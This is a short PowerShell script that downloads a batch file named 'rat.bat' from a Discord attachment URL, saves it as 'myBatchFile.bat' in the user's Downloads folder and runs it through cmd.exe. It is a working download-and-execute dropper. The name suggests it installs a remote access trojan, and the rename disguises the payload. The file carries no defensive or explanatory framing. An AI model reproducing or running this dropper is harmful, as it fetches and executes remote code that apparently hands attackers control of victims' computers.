# Define the URL of the batch file
$batchFileUrl = "https://cdn.discordapp.com/attachments/1223133700846391296/1241562344996343808/rat.bat?ex=664aa68a&is=6649550a&hm=7b6101fd77c5665be9372731fd20939fbcf83f5a13de3dfb08cc3acda60a46d0&"

# Define the local path where the batch file will be saved
$localPath = "$env:USERPROFILE\Downloads\myBatchFile.bat"

# Download the batch file
Invoke-WebRequest -Uri $batchFileUrl -OutFile $localPath

# Check if the batch file exists before attempting to run it
if (Test-Path $localPath) {
    # Execute the batch file
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $localPath"
} else {
    
}
